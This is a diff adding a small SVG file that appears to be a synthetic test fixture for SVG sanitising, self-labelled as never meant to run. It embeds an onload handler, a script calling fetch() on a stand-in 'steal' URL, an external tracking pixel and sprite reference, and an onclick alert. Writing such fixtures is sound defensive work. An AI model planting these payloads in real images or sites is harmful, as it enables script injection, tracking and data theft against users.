@@ -1,0 +1,4 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 40 40" onload="globalThis.__pwned = true"><!-- synthetic: must never run or fetch anything -->
+  <script>globalThis.__pwned = true; fetch("https://example.invalid/steal")</script>
+  <image href="https://example.invalid/tracker.png" width="1" height="1"/><use xlink:href="https://example.invalid/sprite.svg#a"/>
+  <rect width="40" height="40" fill="#7A3FF2" onclick="alert(1)"/></svg>
